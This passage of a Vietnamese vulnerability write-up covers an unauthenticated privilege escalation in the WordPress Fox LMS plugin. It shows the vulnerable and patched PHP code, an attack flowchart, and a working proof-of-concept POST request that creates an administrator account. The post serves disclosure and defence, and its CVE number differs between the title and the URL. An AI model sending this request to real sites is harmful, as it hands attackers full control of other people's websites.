</span></span><span class="line"><span class="cl">        <span class="nv">$currency</span> <span class="o">=</span> <span class="nx">Payment</span><span class="o">::</span><span class="na">instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">getCurrencyCode</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$course</span>         <span class="o">=</span> <span class="nx">get_post</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;courseId&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$course_info</span> <span class="o">=</span> <span class="nx">Fox_Lms_Data</span><span class="o">::</span><span class="na">get_course_by_post_id</span><span class="p">(</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;courseId&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">        <span class="nv">$settings</span> <span class="o">=</span> <span class="nx">Fox_Lms_Data</span><span class="o">::</span><span class="na">get_course_validated_data_from_array</span><span class="p">(</span> <span class="nv">$course_info</span><span class="p">,[]);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$price</span> <span class="o">=</span> <span class="nx">Fox_Lms_Data</span><span class="o">::</span><span class="na">fox_lms_get_course_price</span><span class="p">(</span><span class="nv">$settings</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">        <span class="nv">$courseSettings</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;priceType&#39;</span>  <span class="o">=&gt;</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$settings</span><span class="p">[</span><span class="s1">&#39;fox_lms_payment_type&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$settings</span><span class="p">[</span><span class="s1">&#39;fox_lms_payment_type&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;free&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;price&#39;</span> <span class="o">=&gt;</span> <span class="nv">$price</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// $courseSettings = SettingsManager::get($course-&gt;ID);
</span></span></span><span class="line"><span class="cl">        <span class="nv">$price</span>          <span class="o">=</span> <span class="nx">floatval</span><span class="p">(</span><span class="nv">$courseSettings</span><span class="p">[</span><span class="s1">&#39;price&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="o">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// If price is zero or less, treat as free order: create completed order and enroll user immediately.
</span></span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$price</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">global</span> <span class="nv">$wpdb</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nv">$userId</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">is_user_logged_in</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$userId</span> <span class="o">=</span> <span class="nx">get_current_user_id</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$userData</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;first_name&#39;</span> <span class="o">=&gt;</span> <span class="nx">sanitize_text_field</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;first_name&#39;</span><span class="p">]),</span>
</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;last_name&#39;</span>  <span class="o">=&gt;</span> <span class="nx">sanitize_text_field</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;last_name&#39;</span><span class="p">]),</span>
</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;user_login&#39;</span> <span class="o">=&gt;</span> <span class="nx">sanitize_user</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]),</span>
</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;user_email&#39;</span> <span class="o">=&gt;</span> <span class="nx">sanitize_email</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]),</span>
</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;user_pass&#39;</span>  <span class="o">=&gt;</span> <span class="nx">sanitize_text_field</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]),</span>
</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;role&#39;</span>       <span class="o">=&gt;</span> <span class="nx">sanitize_text_field</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">]),</span>
</span></span><span class="line"><span class="cl">                <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="nv">$userId</span> <span class="o">=</span> <span class="nx">wp_insert_user</span><span class="p">(</span><span class="nv">$userData</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="o">...</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Mở rộng hoặc thu gọn khối mã" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><p>Hàm <code>createOrder()</code> nhận dữ liệu từ request và gán giá trị mặc định, trong đó <strong><code>role</code> mặc định là <code>subscriber</code></strong>. Tuy nhiên, toàn bộ tham số từ phía người dùng gửi lên được trộn trực tiếp vào <code>$params</code> thông qua <code>wp_parse_args()</code> mà <strong>không có bước kiểm tra hay giới hạn giá trị hợp lệ cho <code>role</code></strong>.</p>
<p>Khi khóa học có giá <strong>bằng 0 hoặc miễn phí</strong>, hệ thống sẽ tự động tạo tài khoản người dùng mới nếu người gọi API chưa đăng nhập. Dữ liệu người dùng được lấy trực tiếp từ request, bao gồm:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="s1">&#39;role&#39;</span> <span class="o">=&gt;</span> <span class="nx">sanitize_text_field</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">]),</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>Điều này có nghĩa là kẻ tấn công chỉ cần gửi một request POST tới endpoint <code>/wp-json/fox-lms/v1/payments/create-order</code> và truyền vào giá trị <code>role</code> tùy ý (ví dụ: <code>administrator</code>). Vì endpoint này <strong>không kiểm tra quyền truy cập</strong> và hàm cũng <strong>không validate giá trị role</strong>, tài khoản mới sẽ được tạo với quyền tương ứng.</p>
<p>Kết quả là kẻ tấn công không cần đăng nhập vẫn có thể <strong>tạo tài khoản với quyền quản trị</strong>, dẫn đến <strong>leo thang đặc quyền và chiếm quyền kiểm soát toàn bộ website</strong>.</p>
<p>Bản vá <strong><code>v1.0.5.3</code></strong> đã khắc phục lỗ hổng bằng cách <strong>hardcode giá trị <code>role</code> thành <code>subscriber</code></strong> khi tạo tài khoản người dùng mới, thay vì lấy trực tiếp từ dữ liệu request. Điều này giúp ngăn chặn việc kẻ tấn công truyền vào các giá trị role tùy ý để leo thang đặc quyền.</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$userData</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;first_name&#39;</span> <span class="o">=&gt;</span> <span class="nx">sanitize_text_field</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;first_name&#39;</span><span class="p">]),</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;last_name&#39;</span>  <span class="o">=&gt;</span> <span class="nx">sanitize_text_field</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;last_name&#39;</span><span class="p">]),</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;user_login&#39;</span> <span class="o">=&gt;</span> <span class="nx">sanitize_user</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]),</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;user_email&#39;</span> <span class="o">=&gt;</span> <span class="nx">sanitize_email</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]),</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;user_pass&#39;</span>  <span class="o">=&gt;</span> <span class="nx">sanitize_text_field</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]),</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;role&#39;</span>       <span class="o">=&gt;</span> <span class="s1">&#39;subscriber&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">);</span></span></span></code></pre></td></tr></table></div>
</div>
</div><h2 class="heading-element" id="flow"><span>Flow</span>
  <a href="#flow" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="diagram-container">
  <pre class="mermaid">flowchart TD
A["Attacker (Unauthenticated)"]
--> B["Send POST request to /wp-json/fox-lms/v1/payments/create-order"]

B --> C["Endpoint is publicly accessible (permission_callback = __return_true)"]

C --> D["createOrder() receives request parameters"]

D --> E["wp_parse_args() merges user input into params (role is not validated)"]

E --> F["Attacker sets role=administrator in request"]

F --> G["Course price is free (price <= 0)"]

G --> H["User is not logged in → system creates new user"]

H --> I["wp_insert_user() is called with attacker-controlled role"]

I --> J["New user account is created with Administrator role"]

J --> K["Attacker logs in with newly created account"]

K --> L["Full administrative privileges obtained"]</pre>
  <pre class="mermaid-dark">flowchart TD
A["Attacker (Unauthenticated)"]
--> B["Send POST request to /wp-json/fox-lms/v1/payments/create-order"]

B --> C["Endpoint is publicly accessible (permission_callback = __return_true)"]

C --> D["createOrder() receives request parameters"]

D --> E["wp_parse_args() merges user input into params (role is not validated)"]

E --> F["Attacker sets role=administrator in request"]

F --> G["Course price is free (price <= 0)"]

G --> H["User is not logged in → system creates new user"]

H --> I["wp_insert_user() is called with attacker-controlled role"]

I --> J["New user account is created with Administrator role"]

J --> K["Attacker logs in with newly created account"]

K --> L["Full administrative privileges obtained"]</pre>
  <pre class="mermaid-neutral">flowchart TD
A["Attacker (Unauthenticated)"]
--> B["Send POST request to /wp-json/fox-lms/v1/payments/create-order"]

B --> C["Endpoint is publicly accessible (permission_callback = __return_true)"]

C --> D["createOrder() receives request parameters"]

D --> E["wp_parse_args() merges user input into params (role is not validated)"]

E --> F["Attacker sets role=administrator in request"]

F --> G["Course price is free (price <= 0)"]

G --> H["User is not logged in → system creates new user"]

H --> I["wp_insert_user() is called with attacker-controlled role"]

I --> J["New user account is created with Administrator role"]

J --> K["Attacker logs in with newly created account"]

K --> L["Full administrative privileges obtained"]</pre><div class="diagram-copy-btn" aria-label="Copy Mermaid code" role="button"><i class="fa-regular fa-clone" aria-hidden="true"></i></div>
<template><pre>flowchart TD
A["Attacker (Unauthenticated)"]
--> B["Send POST request to /wp-json/fox-lms/v1/payments/create-order"]

B --> C["Endpoint is publicly accessible (permission_callback = __return_true)"]

C --> D["createOrder() receives request parameters"]

D --> E["wp_parse_args() merges user input into params (role is not validated)"]

E --> F["Attacker sets role=administrator in request"]

F --> G["Course price is free (price <= 0)"]

G --> H["User is not logged in → system creates new user"]

H --> I["wp_insert_user() is called with attacker-controlled role"]

I --> J["New user account is created with Administrator role"]

J --> K["Attacker logs in with newly created account"]

K --> L["Full administrative privileges obtained"]</pre></template>
</div><h2 class="heading-element" id="proof-of-concept-poc"><span>Proof of Concept (PoC)</span>
  <a href="#proof-of-concept-poc" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ol>
<li>Gửi request tạo user:</li>
</ol>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-http"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/wp-json/fox-lms/v1/payments/create-order</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="g">role=administrator&amp;first_name=hacker&amp;last_name=hacker&amp;username=hacker&amp;email=hacker@gmail.com&amp;courseId=course_id</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p><strong>Result</strong>:</p>
<p><figure><a class="lightgallery" target="_blank" href="/posts/2026-01-08-cve-2025-14156/result.png" title="Thành công tạo user với role=administrator" data-thumbnail="/posts/2026-01-08-cve-2025-14156/result.png" data-sub-html="<h2>Result</h2><p>Thành công tạo user với role=administrator</p>"><img loading="lazy" src='/posts/2026-01-08-cve-2025-14156/result.png' alt="Result" height="530" width="1555"></a><figcaption class="image-caption">Thành công tạo user với role=administrator</figcaption>
  </figure></p>
<ol start="2">
<li>Login với user vừa tạo.</li>
</ol>
<h2 class="heading-element" id="conclusion"><span>Conclusion</span>
  <a href="#conclusion" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Lỗ hổng <strong>CVE-2025-2563</strong> xuất phát từ việc <strong>REST API được public không kiểm soát quyền truy cập</strong> và <strong>tham số <code>role</code> không được validate</strong>, cho phép attacker chưa xác thực tạo tài khoản với quyền tùy ý, bao gồm <strong>Administrator</strong>. Mặc dù công bố cho rằng đã vá ở <code>1.0.5.2</code>, nhưng thực tế bản vá chỉ hoàn chỉnh từ <strong><code>1.0.5.3</code></strong> khi <code>role</code> được hardcode về <code>subscriber</code>. Người dùng cần cập nhật plugin và rà soát lại các tài khoản đã tồn tại.</p>
<h2 class="heading-element" id="key-takeaways"><span>Key Takeaways</span>
  <a href="#key-takeaways" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>Không expose API nhạy cảm khi chưa kiểm soát quyền.</li>
<li>Không tin tưởng dữ liệu từ client, đặc biệt là tham số phân quyền.</li>
<li>Luôn validate và whitelist input.</li>
<li>Kiểm tra thực tế bản vá, không chỉ dựa vào thông báo.</li>
</ul>
<h2 class="heading-element" id="references"><span>References</span>
  <a href="#references" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><a href="https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/" target="_blank" rel="external nofollow noopener noreferrer">Privilege Escalation</a></p>
<p><a href="https://patchstack.com/database/wordpress/plugin/fox-lms/vulnerability/wordpress-fox-lms-plugin-1-0-4-7-1-0-5-1-unauthenticated-privilege-escalation-vulnerability" target="_blank" rel="external nofollow noopener noreferrer">WordPress Fox LMS Plugin 1.0.4.7-1.0.5.1 is vulnerable to a high priority Privilege Escalation</a></p></div><hr class="awesome-hr" />
    <h2 id="see-also">Nội dung liên quan</h2>
    <ul><li>
          <a href="/vi/posts/2026-01-07-cve-2025-2563/" title="CVE-2025-2563 Analysis &amp; POC">CVE-2025-2563 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-06-cve-2025-7654/" title="CVE-2025-7654 Analysis &amp; POC">CVE-2025-7654 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-05-cve-2025-55707/" title="CVE-2025-53425 Analysis &amp; POC">CVE-2025-53425 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-04-cve-2025-53425/" title="CVE-2025-53425 Analysis &amp; POC">CVE-2025-53425 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-03-cve-2025-6325/" title="CVE-2025-6325 Analysis &amp; POC">CVE-2025-6325 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-02-cve-2025-11923/" title="CVE-2025-11923 Analysis &amp; POC">CVE-2025-11923 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-01-cve-2025-11749/" title="CVE-2025-11749 Analysis &amp; POC">CVE-2025-11749 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-12-31-cve-2024-13887/" title="CVE-2024-13887 Analysis &amp; POC">CVE-2024-13887 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-12-30-cve-2024-12114/" title="CVE-2024-12114 Analysis &amp; POC">CVE-2024-12114 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-12-28-cve-2025-10039/" title="CVE-2025-10039 Analysis &amp; POC">CVE-2025-10039 Analysis &amp; POC</a></li></ul><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod"><span title="Cập nhật ngày 2026-01-08 14:55:45">Cập nhật ngày 2026-01-08&nbsp;<a class="git-hash" href="https://github.com/w41bu1/w41bu1.github.io/commit/a7d4b83ecb615042df6fce1c83fea6021db52b0a" rel="external nofollow noopener noreferrer" target="_blank" title="Add post 2026-01-08-CVE-2025-14156&#10&#10Commit: a7d4b83ecb615042df6fce1c83fea6021db52b0a [a7d4b83e]&#10Author: w41bu1&#10Date: 2026-01-08 14:55:45"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i>a7d4b83e</a></span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"><span><a href="/vi/posts/2026-01-08-cve-2025-14156/index.md" title="Đọc với định dạng Markdown" class="link-to-markdown">Đọc với định dạng Markdown</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2026-01-08-CVE-2025-14156/index.vi.md?plain=1" title="Xem mã nguồn" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-source">Xem mã nguồn</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/edit/main/content/posts/2026-01-08-CVE-2025-14156/index.vi.md" title="Chỉnh sửa trang này" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">Chỉnh sửa trang này</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/issues/new?title=[BUG]%20CVE-2025-2563&#43;Analysis&#43;%26&#43;POC&amp;body=%7cField%7cValue%7c%0A%7c-%7c-%7c%0A%7cTitle%7cCVE-2025-2563&#43;Analysis&#43;%26&#43;POC%7c%0A%7cURL%7chttp://localhost:1313/vi/posts/2026-01-08-cve-2025-14156/%7c%0A%7cFilename%7chttps://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2026-01-08-CVE-2025-14156/index.vi.md?plain=1%7c" title="Báo cáo lỗi" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-report">Báo cáo lỗi</a></span><span><a href="vscode://file//home/w41/Project/w41bu1.github.io/content/posts/2026-01-08-CVE-2025-14156/index.vi.md" title="Mở trong trình chỉnh sửa" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">Mở trong trình chỉnh sửa</a></span></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="Chia sẻ trên X" data-sharer="twitter" data-url="http://localhost:1313/vi/posts/2026-01-08-cve-2025-14156/" data-title="CVE-2025-2563 Analysis &amp; POC" data-hashtags="analyst,plugin,privilege escalation"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Facebook" data-sharer="facebook" data-url="http://localhost:1313/vi/posts/2026-01-08-cve-2025-14156/" data-hashtag="analyst"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/vi/posts/2026-01-08-cve-2025-14156/"><i class="fa-brands fa-linkedin fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/vi/posts/2026-01-08-cve-2025-14156/" data-title="CVE-2025-2563 Analysis &amp; POC"><i class="fa-brands fa-hacker-news fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/vi/tags/analyst/" class="post-tag" title="Nhãn - Analyst">Analyst</a><a href="/vi/tags/plugin/" class="post-tag" title="Nhãn - Plugin">Plugin</a><a href="/vi/tags/privilege-escalation/" class="post-tag" title="Nhãn - Privilege Escalation">Privilege Escalation</a></section>
    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Quay lại</a></span>&nbsp;|&nbsp;<span><a href="/vi/">Trang chủ</a></span>
    </section>
  </div><div class="post-nav"><a href="/vi/posts/2026-01-07-cve-2025-2563/" class="post-nav-item" rel="prev" title="CVE-2025-2563 Analysis &amp; POC"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>CVE-2025-2563 Analysis &amp; POC</a></div>
</div>
</article>

